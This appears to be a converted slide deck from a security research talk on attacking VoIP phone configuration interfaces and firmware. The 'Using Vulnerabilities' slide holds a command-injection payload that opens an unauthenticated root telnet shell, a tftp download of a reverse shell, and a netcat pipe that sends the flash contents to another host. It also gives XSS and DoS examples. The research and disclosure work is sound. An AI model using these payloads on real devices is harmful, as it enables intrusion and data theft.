# I'm on Your Phone, Listening: Attacking VoIP Configuration Interfaces

## Authors
- **Stephan Huber** | Fraunhofer SIT, Germany
  - Security Researcher at Testlab Mobile Security (Fraunhofer SIT)
  - Code Analysis Tool Development
  - IoT Security
  - Founder of @TeamSIK

- **Philipp Roskosch** | Fraunhofer SIT, Germany
  - Security Researcher & Penetration Tester at Secure Software Engineering (Fraunhofer SIT)
  - Static Code Analysis
  - IoT Vulnerability Detection Research
  - Day 1 Member of @TeamSIK

## Acknowledgements
- Alexander Traud
- Beer Announcement

## Past Projects
- Def Con 26: Tracker Apps
- Def Con 25: Password Manager Apps
- Def Con 24: Anti-Virus Apps
- Blackhat EU 2015: BAAS Security
- [TeamSIK Website](https://team-sik.org)

## What's Next?
- Wide distribution
- Complex software
- Readily accessible

## The Target Devices
### Perfect World
- Internet
- Guest Network
- Workstation Network
- VoIP Phone Network

### Real World
- Internet
- Network
- VoIP Phones
- Guests
- Workstations
- Publicly Reachable!

## Agenda
- Background
- IoT Hacking 101
- Findings
  - DoS, Weak Crypto, XSS, CSRF
  - Command Injection
  - Authentication Bypass
  - Memory Corruption
- Recommendations
- Responsible Disclosure Experiences
- Summary

## Background: Architecture and Attack Targets
- **Hardware**
  - ARM/MIPS
  - Flash
  - Linux OS
  - Kernel
  - Bootloader
- **Software**
  - init
  - watchdog
  - sipd
  - Webserver
  - Basic setup
  - Starts daemons
  - Checks if daemons run

## Methodology
### Abstract Methodology
- Webserver is Running
- Web Pentesting
- Static Analysis
- Dynamic Analysis
- Setup VoIP Phone
- Attach HTTP Proxy
- Extract Firmware
- Emulation

### Tools
- **Web Pentesting**: ZAP, Burp Suite
- **Static Analysis**: IDA Pro, Ghidra
- **Dynamic Analysis**: binwalk, yara, gdb, gdbserver, strace, ropper, IDA rop Plugin
- **Fuzzing**: mutiny, boofuzz
- **Emulation**: qemu

### Firmware Access for Software People
- Out of scope: Desoldering chips and complex hardware setup
- **Methods**
  - Download the firmware from vendor/manufacturer
  - Get image from update traffic
  - Get image or files from the device
- **Challenges**
  - Only updates, diffs, or patches available
  - Encrypted images
  - No update server, only manual HW

### Hardware Tools
- JTAGulator by Joe Grand (presented at DC 21)
- Bus Pirate
- mArt UART adapter
- Raspberry Pi

### Examples: SPI
- **Bus Pirate Connection**
  - CS: Chip Select
  - MISO: Master In, Slave Out
  - WP: Write Protect
  - GND: Ground
  - MOSI: Master Out, Slave In
  - CLK: SPI Clock
  - HOLD: Hold
  - VCC: Supply

- **Flashrom Commands**
  - `flashrom -p buspirate_spi:dev=/dev/ttyUSB0`
  - `flashrom -p buspirate_spi:dev=/dev/ttyUSB0 -c W25Q64.V -r firmw2.bin`
  - `binwalk -eM firmw.bin`

### Examples: UART
- Fanvil X6 UART connection
- UART bootloader via serial console (minicom, screen, putty, etc.)

### Examples: Bootloader
- **Bootloader Menu**
  - `help`
  - `info`
  - `reboot`
  - `run [app addr] [entry addr]`
  - `r [addr]`
  - `w [addr] [val]`
  - `d [addr]`
  - `resetcfg`
- **Dump flash memory**
  - `d 0x81000000 7700000`

### Using Vulnerabilities
- **Command Injection**
  - `;busybox telnetd &#`
  - Root shell without authentication
- **TFTP Client**
  - `tftp -g -r revshell 10.148.207.102 6969`
  - `tftp -p -r /dev/mtdblock0 10.148.207.102 6969`
  - Netcat: `nc –lp 4444 | tar x`
  - `busybox tar cf - /dev/mtdblock0 | busybox nc 10.148.207.227`

### Emulation Approaches
- CPU emulation (e.g., Unicorn)
- User mode emulation
- System mode emulation (third-party OS)
- System mode emulation with original file system
- System mode emulation including original kernel modules
- Full system emulation (including unknown peripherals and interfaces)

### Firmware Emulation
- **Emulator (QEMU ARM/MIPS)**
  - UI
  - API
  - Process
  - Firmware FS
  - Kernel
  - chroot environment
  - Linux FS
  - Analyzing tools: gdb, strace, dynamic hooks, value spoofing/runtime patching

### Example gdb Patch Script
- **gdb script**
  - `set target-async on`
  - `set non-stop off`
  - `target remote localhost:2345`
  - `set follow-fork-mode parent`
  - `show follow-fork-mode`
  - `c`
  - `br *0x1a1bc`
  - `c`
  - `set $r0=8`
  - `c`

### Findings
- **DoS**
  - Limited CPU/memory resources
  - Parsing problems
  - Bad TCP/IP stack implementation
  - Memory corruptions, usage of "bad C" functions
  - **Example: Mitel 6865i**
    - `nmap -p 1-65535 -T4 -A my.voip.phone`
  - **Example: Cisco IP Phone 7821**
    - `curl 'http://10.148.207.42/basic"/init.json' -H …`
  - **CVE-2017-3731 – OpenSSL**
    - Malformed packet causes out-of-bounds read
    - Affected devices: Fanvil X1P, Mitel, ALE, Samsung

- **Bad Crypto**
  - **Example: Akuvox R50**
    - Config file export
    - Credentials are encrypted
    - `echo -n "xzahQYJBxcgPwVwdfJVoYTfCwiyaoosyF5BAHQ8zleoVwcdBKPXCx0aQxIaJ" | base64 -d | xxd`
    - Self-implemented AES decryption
    - Simple substitution
    - Hardcoded key in FW: "akuvox"

- **Web Attacks**
  - **XSS: AudioCodes 405HD**
    - My favorite contact name: `<script>alert('XSS')</script>`
  - **Information Leak: Gigaset Maxwell Basic**
    - `GET http://gigaset.voip/Parameters`